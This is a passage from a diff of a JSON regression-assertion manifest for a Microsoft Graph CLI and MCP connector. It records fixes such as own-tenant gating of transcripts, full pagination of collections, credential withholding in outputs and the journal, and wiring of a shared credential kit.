+     "contains": "func transcriptsGate(c *client.Client) (tokenClaims, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate.go",
+     "contains": "if claims.Idp != \"\" && !strings.EqualFold(claims.Idp, claims.Iss) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts.go",
+     "contains": "ann[\"mcp:hidden\"] = \"true\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_download.go",
+     "contains": "if flagOut != \"\" && cliutil.IsMCPChildEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_list.go",
+     "contains": "claims, err := transcriptsGate(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_all.go",
+     "contains": "if !claims.appOnly() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_list.go",
+     "not_contains": "TODO: implement novel feature"
+    },
+    {
+     "file": "cli/internal/cli/transcripts_download.go",
+     "not_contains": "TODO: implement novel feature"
+    },
+    {
+     "file": "cli/internal/cli/transcripts_all.go",
+     "not_contains": "TODO: implement novel feature"
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate_test.go",
+     "contains": "func TestTranscriptsGateOwnTenantOnly(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/transcripts_test.go",
+     "contains": "func TestTranscriptsKeepNothingOnDisk(t *testing.T) {",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "rootCmd.AddCommand(newNovelTranscriptsCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts.go",
+     "contains": "cmd.AddCommand(newNovelTranscriptsListCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate.go",
+     "contains": "\"tid\": &c.Tid",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_download.go",
+     "contains": "func transcriptFormat(noSpeakers bool) string {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section and the own-tenant reason for transcripts, and no longer promise a five-minute response cache (the cache is off on every client). The MCP read-only switch is described as it behaves: it drops the local-write learn tools too.",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. msp-skills keeps the generated README as guide.md and SKILL.md at the skill root, so the asserts read those.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "contains": "Why own tenant only:"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "Why own tenant only:"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "stay available"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "learn store stay"
+    },
+    {
+     "file": "guide.md",
+     "contains": "including the local-write learn tools"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "including the local-write learn tools"
+    }
+   ]
+  },
+  {
+   "id": "graph-permission-names-not-hosts",
+   "class": "docs",
+   "summary": "insights/consent.go keeps Graph permission names in space-separated lists (permissionSet, permissionsByID), never one name per string literal.",
+   "why": "Press 4.34.2's novel-host dogfood gate reads a lone literal such as Mail.Read or RoleManagement.ReadWrite.Directory as a hostname (.read and .directory are delegated gTLDs) and fails shipcheck. Same tables, same matching; TestPermissionTablesKeptTheirNames pins the contents. Press retro item: the gate should not treat dotted permission identifiers as hosts.",
+   "status": "active",
+   "spec_encode_followup": "retire when the press novel-host gate stops flagging dotted identifiers",
+   "asserts": [
+    {
+     "file": "cli/internal/insights/consent.go",
+     "contains": "func permissionSet(names string) map[string]bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/consent.go",
+     "contains": "var escalationAppRoles = permissionSet(`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/consent.go",
+     "not_contains": "\"RoleManagement.ReadWrite.Directory\""
+    },
+    {
+     "file": "cli/internal/insights/consent.go",
+     "not_contains": "\"Mail.Read\""
+    },
+    {
+     "file": "cli/internal/insights/consent_tables_test.go",
+     "contains": "func TestPermissionTablesKeptTheirNames(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dead-generated-helpers-removed",
+   "class": "docs",
+   "summary": "Four generated helpers nothing calls (hasChangedLocalFlags, requiredInputWaived, retainCLIQueryParams, retainExplicitQueryParams) are removed from helpers.go.",
+   "why": "Press 4.34.2 dogfood fails shipcheck on dead helper functions. A reprint regenerates helpers.go with them; tools/apply_edits.py removes them again.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func hasChangedLocalFlags("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func requiredInputWaived("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainCLIQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainExplicitQueryParams("
+    }
+   ]
+  },
+  {
+   "id": "pull-replaces-snapshot",
+   "class": "stale-snapshot",
+   "summary": "A completed `pull` REPLACES each resource's stored rows (generic, FTS and typed table) in one transaction with exactly what Graph returned; a resource whose read or member embed fails keeps its previous snapshot whole. Role members are read with $select id,displayName,userPrincipalName,userType,accountEnabled (the endpoint supports $select only, max 1,000). `pull` is a local-data writer, so MICROSOFT_GRAPH_NO_LOCAL_DATA=1 refuses it.",
+   "why": "Codex r1 (4.34.2 reprint) classes stale-snapshot-kept and property-not-requested: the typed upserts merge keep-richer and never delete, so a removed license, an emptied group, a revoked admin and a deleted user stayed current; role members came back in Graph's default projection (no accountEnabled/userType), so admins audit never flagged a disabled or guest admin. ReplaceResources lives in a hand file; the two generated-file lines (root.go localDataWriterCommands, export.go) are replayed by tools/apply_edits.py. Test: TestPullKeepsTheTenantAsGraphReturnsIt.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/msgraph_replace.go",
+     "contains": "func (s *Store) ReplaceResources(resourceType string, items []json.RawMessage) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull.go",
+     "contains": "failed = st.ReplaceResources(key, items)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull.go",
+     "contains": "\"$select\": \"id,displayName,userPrincipalName,userType,accountEnabled\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "map[string]bool{\"sync\": true, \"workflow archive\": true, \"pull\": true}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull_snapshot_test.go",
+     "contains": "func TestPullKeepsTheTenantAsGraphReturnsIt(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "class": "resource-leak",
+   "summary": "`export --output` closes the output file on every error path, not only after a successful start; the held-value WithholdingFile pipe otherwise blocked the process forever after an API error.",
+   "why": "Codex r1 P2 (4.34.2 reprint): generated export.go closed outFile only when err != nil after a step that nils it on success, so an API error before that step left the withholding pipe open and the command hung. One line in a generated file, replayed by tools/apply_edits.py. Test: TestExportOutputReturnsAfterAnAPIError.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "if outFile != nil {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "not_contains": "if err != nil && outFile != nil {"
+    },
+    {
+     "file": "cli/internal/msgraphblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "apps-consent-reads-every-page",
+   "class": "incomplete-read",
+   "summary": "`apps consent` reads every collection through @odata.nextLink (no first-page-only fetch, no 999-row cap) and names, in the result note, every app whose permissions could not be read; the shared pager refuses a non-collection page after the first, an unparseable nextLink and a runaway page count.",
+   "why": "Codex r1 (4.34.2 reprint) class incomplete-read-as-complete: an escalation grant on page 2 was never seen and a refused appRoleAssignments read rendered as 'no flags'. Test: TestAppsConsentReadsEveryPage. Codex r2: a 200 page without a value array ({} or a null value) is an error, not an empty collection, because pull replaces the snapshot with what it read.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/apps_consent.go",
+     "not_contains": "fetchGraphList"
+    },
+    {
+     "file": "cli/internal/cli/apps_consent.go",
+     "contains": "could not be read, so their flags are incomplete",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/apps_consent_test.go",
+     "contains": "func TestAppsConsentReadsEveryPage(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull.go",
+     "contains": "if err := json.Unmarshal(data, &env); err != nil || env.Value == nil {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "transcripts-judge-sent-credential",
+   "class": "write-safety",
+   "summary": "The transcripts gate judges every Authorization the request could carry (the auth header and any [headers] Authorization from config) and re-checks the header on the wire; a transcripts run refuses every sink except stdout and --out (--deliver, --receipt, --receipt-file, --audit-dir, --data-source local) before dry-run.",
+   "why": "Codex r1 (4.34.2 reprint) classes cross-tenant-transcript-read (a config header carrying a client-tenant token bypassed the tid check) and transcript-persisted-outside-out (delivery and receipt sinks kept meeting content). Tests: TestTranscriptsGateJudgesTheSentCredential, TestTranscriptsRefuseEveryOtherSink, TestTranscriptsKeepNothingOnDisk.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/transcripts_gate.go",
+     "contains": "type transcriptsWireCheck struct {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate.go",
+     "contains": "func transcriptsCredentialClaims(authHeader, home string) (tokenClaims, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts.go",
+     "contains": "func transcriptsKeepNothing(flags *rootFlags) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_list.go",
+     "contains": "if err := transcriptsKeepNothing(flags); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_download.go",
+     "contains": "if err := transcriptsKeepNothing(flags); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_all.go",
+     "contains": "if err := transcriptsKeepNothing(flags); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate_test.go",
+     "contains": "func TestTranscriptsGateJudgesTheSentCredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcripts_gate_test.go",
+     "contains": "func TestTranscriptsRefuseEveryOtherSink(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-graph-root-not-placeholder",
+   "class": "doctor-truth",
+   "summary": "doctorShippedBaseURL is empty: Microsoft Graph has one public API root for every tenant, so the shipped default is the operator's real endpoint and doctor must probe it, not refuse it as a placeholder.",
+   "why": "Codex r1 P2 (4.34.2 reprint): with the shipped Graph root set as the placeholder, doctor refused to check every default install. Fleet precedent: hubspot and the other single-root connectors ship the constant empty. A fleet re-mint of doctor_verdict.go restores the value.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "analytics-declare-data-source",
+   "class": "data-source-contract",
+   "summary": "Each store analytic declares pp:data-source local at runtime and apps consent declares live, so a contradicting --data-source is refused and the output is labelled with its real source.",
+   "why": "Codex r1 P2 (4.34.2 reprint): the strategy lived only in a comment, so `--data-source live` silently read the local store and apps consent labelled live results local. Test: TestAnalyticsRefuseTheOtherDataSource.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/admins_audit.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/groups_risk.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/licenses_waste.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/licenses_orphans.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/licenses_map.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/managed_devices_drift.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/security_triage.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/tenant_snapshot.go",
+     "contains": "\"pp:data-source\": \"local\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/apps_consent.go",
+     "contains": "\"pp:data-source\": \"live\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull_snapshot_test.go",
+     "contains": "func TestAnalyticsRefuseTheOtherDataSource(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-credentials-verdict-shown",
+   "class": "doctor-truth",
+   "summary": "doctor's own fixed verdicts under the \"credentials\" and \"credentials_location\" keys (valid, rejected, scope-limited, not verified; where the credential came from) are shown; a probe error goes under \"probe_error\", never folded into the verdict.",
+   "why": "The old output funnel redacted by field name, so it needed an allowlist for doctor's verdict (retired with the funnel; the credential kit withholds by held value, not by key name, so the verdict is shown by construction). The probe error stays out of the verdict text: \"error: <text>\" once showed whatever a 2xx HTML page echoed. A probe error that repeats a held value withholds the doctor output whole (the kit's notice), which TestNoCredentialInAnyOutput's battery runs.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"probe_error\"] = authErr.Error()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "fmt.Sprintf(\"error: %s\", authErr)"
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "report[\"probe_error\"] = err.Error()",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-startup-error-delivered",
+   "class": "output-delivery",
+   "summary": "The MCP server delivers its startup errors (no HTTP token, bad --addr, missing TLS pair, unknown transport) before it exits, instead of exiting 1 in silence.",
+   "why": "main called os.Exit right after writing to stderr, before the output filter delivered the line. `microsoft-graph-mcp --transport http` without MICROSOFT_GRAPH_MCP_HTTP_TOKEN exited 1 with no message (verify-msp-skills feature 3). Under the credential kit, run() returns the exit code and main ends with credkit.Exit, which delivers what the kit's pipes hold before exiting. A reprint regenerates main.go with plain os.Exit calls.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "credkit.Exit(run())",
      "code_only": true
     },
     {
      "file": "cli/cmd/microsoft-graph-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "contains": "func run() int {",
      "code_only": true
     },
     {
-     "file": "cli/cmd/microsoft-graph-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/startup_exit_test.go",
+     "contains": "func TestHTTPWithoutTokenNamesTheVariable(t *testing.T)"
+    }
+   ]
+  },
+  {
+   "id": "teams-phone-agent-fields",
+   "class": "incomplete-read",
+   "summary": "--agent and --compact output of phone-numbers and teams-users (list and get) keeps the telephone number, number type and voice settings.",
+   "why": "Compaction keeps only high-gravity field names, so `phone-numbers list --agent` returned no telephoneNumber and `teams-users list --agent` no numbers, Enterprise Voice flag or policy assignments: an agent could not answer the question the command exists for. The four generated commands pass a keep list (msgraph_teams_fields.go) to compactFieldsKeep / printOutputWithFlagsMetaAndKeep. A reprint regenerates the plain compactFields calls.",
+   "status": "active",
+   "spec_encode_followup": "carry these keep fields into the library spec's documented compact fields for numberAssignment and teamsUserConfiguration",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/msgraph_teams_fields.go",
+     "contains": "phoneNumberAgentFields = []string{\"telephoneNumber\"",
      "code_only": true
     },
     {
-     "file": "cli/cmd/microsoft-graph-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/phone-numbers_list.go",
+     "contains": "phoneNumberAgentFields",
+     "min_count": 2,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/phone-numbers_get.go",
+     "contains": "phoneNumberAgentFields",
+     "min_count": 2,
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/cli/teams-users_list.go",
+     "contains": "teamsUserAgentFields",
+     "min_count": 2,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/cli/teams-users_get.go",
+     "contains": "teamsUserAgentFields",
+     "min_count": 2,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/cli/msgraph_teams_fields_test.go",
+     "contains": "func TestTeamsPhoneAgentOutputKeepsTheirFields(t *testing.T)"
+    }
+   ]
+  },
+  {
+   "id": "teams-phone-reads-every-page",
+   "class": "incomplete-read",
+   "summary": "phone-numbers list, teams-users list and pull read the whole Teams Phone collection: numberAssignments by $skip windows (plus any nextLink) until an empty page, userConfigurations by @odata.nextLink; a server that ignores $skip fails the read.",
+   "why": "Adversarial review 2026-10-28 (P1): the generated list commands read one page, so a tenant with more than 500 numbers (Graph's documented default page, https://learn.microsoft.com/en-us/graph/api/teamsadministration-telephonenumbermanagementroot-list-numberassignments) was shown its first 500 as the whole tenant, with no hint, while README and page.json present the command as the answer to which numbers are unassigned. pull paged numberAssignments by nextLink only. The two generated commands call teamsListRead (hand file msgraph_teams_pages.go); a reprint regenerates the single-page resolveRead call. TestTeamsPhoneListsReadEveryPage fails on the old wiring.",
+   "status": "active",
+   "spec_encode_followup": "press: page $skip-paged collections to the end in generated list commands",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/phone-numbers_list.go",
+     "contains": "teamsListRead(cmd.Context(), c, flags, \"phone-numbers\", path, params, true, cmd.ErrOrStderr())",
+     "code_only": true
     },
     {
-     "file": "cli/internal/cli/auth_login.go",
-     "contains": "if w := cliutil.FunnelWithhold(string(body), []string{clientSecret}); cliutil.FunnelWithheld(w) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/teams-users_list.go",
+     "contains": "teamsListRead(cmd.Context(), c, flags, \"teams-users\", path, params, false, cmd.ErrOrStderr())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_teams_pages.go",
+     "contains": "func graphGetAllSkipPages(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pull.go",
+     "contains": "skipPaged: true}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_teams_pages_test.go",
+     "contains": "func TestTeamsPhoneListsReadEveryPage(t *testing.T)"
+    }
+   ]
+  },
+  {
+   "id": "pull-not-mcp-read-only",
+   "class": "mcp-safety",
+   "summary": "pull, which replaces the local store's snapshots, carries no read-only hint: MICROSOFT_GRAPH_MCP_READ_ONLY=1 drops it as it drops sync, and it stays on the MCP local-only list (no tenant state changes, no confirm gate).",
+   "why": "Adversarial review 2026-10-28 (P2, one line): pull was annotated mcp:read-only, so the read-only switch kept a tool that rewrites and deletes local snapshots and a host could auto-approve it, while sync and workflow archive were dropped and the docs say the switch drops local writes.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pull.go",
+     "not_contains": "Annotations: map[string]string{\"mcp:read-only\": \"true\"}"
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/msgraph_confirm.go",
+     "contains": "\"pull\":             true,",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "list-reads-every-page",
+   "class": "incomplete-read",
+   "summary": "Every live read of a Graph collection goes through GetCollection: the list commands (the generated resolveRead in data_source.go), export, tail and every MCP endpoint tool. It follows every @odata.nextLink through the configured host, reads the $skip-paged numberAssignments collection in $skip windows, and returns the whole collection as one page, or fails; a response that is not a paged collection is returned as sent.",
+   "why": "Second publish pass review budget, class incomplete-read-as-complete (P1): the MCP phone-numbers_list tool read Graph's default page of 500 numbers (https://learn.microsoft.com/en-us/graph/api/teamsadministration-telephonenumbermanagementroot-list-numberassignments) and reported it as the tenant, and every other generated list command and MCP list tool dropped @odata.nextLink the same way (users list read 100 users of any tenant). One reader for every list path replaces the per-command fix. TestEveryListCommandReadsEveryPage (14 of 15 commands) and TestMCPListToolsReadEveryPage (all 15 tools) fail on the old wiring. A reprint of data_source.go, tools.go, export.go or tail.go restores the single-page read.",
+   "status": "active",
+   "spec_encode_followup": "press: follow @odata.nextLink (and $skip windows) to the end in generated list commands and MCP endpoint tools",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/msgraph_teams_pages.go",
+     "contains": "func GetCollection(ctx context.Context, c *client.Client, path string, params, headers map[string]string) (json.RawMessage, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "data, err := GetCollection(ctx, c, path, params, headers)",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "data, err = cli.GetCollection(ctx, c, path, params, nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "data, err = cli.GetCollection(ctx, c, path, params, headers)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "data, err := GetCollection(cmd.Context(), c, path, params, nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "if graphReadWhole || config.paginationType == \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/tail.go",
+     "contains": "fetchAndEmit(cmd.Context(), collectionGetter{c}, path, readConfig, enc)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msgraph_list_pages_test.go",
+     "contains": "func TestEveryListCommandReadsEveryPage(t *testing.T) {"
+    },
+    {
+     "file": "cli/internal/mcp/msgraph_list_pages_test.go",
+     "contains": "func TestMCPListToolsReadEveryPage(t *testing.T) {"
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name: the <PREFIX>_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name and every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>\" when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. journal_credential_hardening_test.go (ported from the fleet reference by hand; the fleet tool did not merge) drives each path with a credential and fails if it reaches any file under the test home. Holding the credentials the program knows is the credential kit's job (credkit-wiring); this entry covers what the journal keeps of text the kit cannot know.",
+   "why": "Press 4.34.0 and 4.34.2 (learn/journal.go.tmpl) return the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and record every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. Known limits: a guessable override can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; recall and teach query text is kept as the press designs it. A reprint that drops these edits fails these asserts and TestJournalCredentialHardening; restore them by hand (the fleet tool did not merge, owner rule 2026-10-28). TestJournalCredentialHardening fails on the old code in 6 cases.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be the placeholder too, and teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "lookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "isDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
      "code_only": true
     }
    ]
@@ -539,6 +1126,529 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own holder, funnel, output chokepoint, outbound checks and SQLite wrapper. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit; the Graph client goes through credkit.Transport under the origin pin, as do the auth login, feedback, --deliver webhook and doctor probe clients; every file write except config.toml and the 0600 credential store (sources, listed in Declarations.Files) goes through the kit; MCP stdio frames, tool results and child processes go through the kit; stdout and stderr are the kit's pipes, and the terminal check is credkit.Terminal.",
+   "why": "One contract, one matcher and one set of sinks replace the connector-only copies (cliutil/msgraph_output.go, msgraph_secrets.go, msgraph_outbound.go, secret_funnel.go, the store driver, the cli and mcp filters), and a matcher fix reaches this connector by vendoring. The kit withholds a whole unit that carries a held value where the old layer redacted in place, so the black-box batteries assert the kit's notice and quiet-server controls (TestOrdinaryRecordsReachEveryFile, TestOrdinaryRecordsStillPrint) prove ordinary records still reach every sink. credentialFiles lists the run's own config first, as Cobra parses --config and --home, because the kit takes the first base_url it finds as the one origin a credential may reach (TestCredentialFilesReadsArgvLikeCobra). In-process tests never run credkit.Start, so internal/cli and internal/mcp test seams set client.OutboundGuard to the identity; TestOutboundGuardIsTheKit keeps the shipped value the kit's.",
+   "spec_encode_followup": "Press-side: generate main, the sinks and a Declarations literal against the kit from a per-connector declarations file, so a reprint keeps the wiring by construction.",
+   "asserts": [
+    {
+     "file": "cli/cmd/microsoft-graph-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/microsoft-graph-cli/main.go",
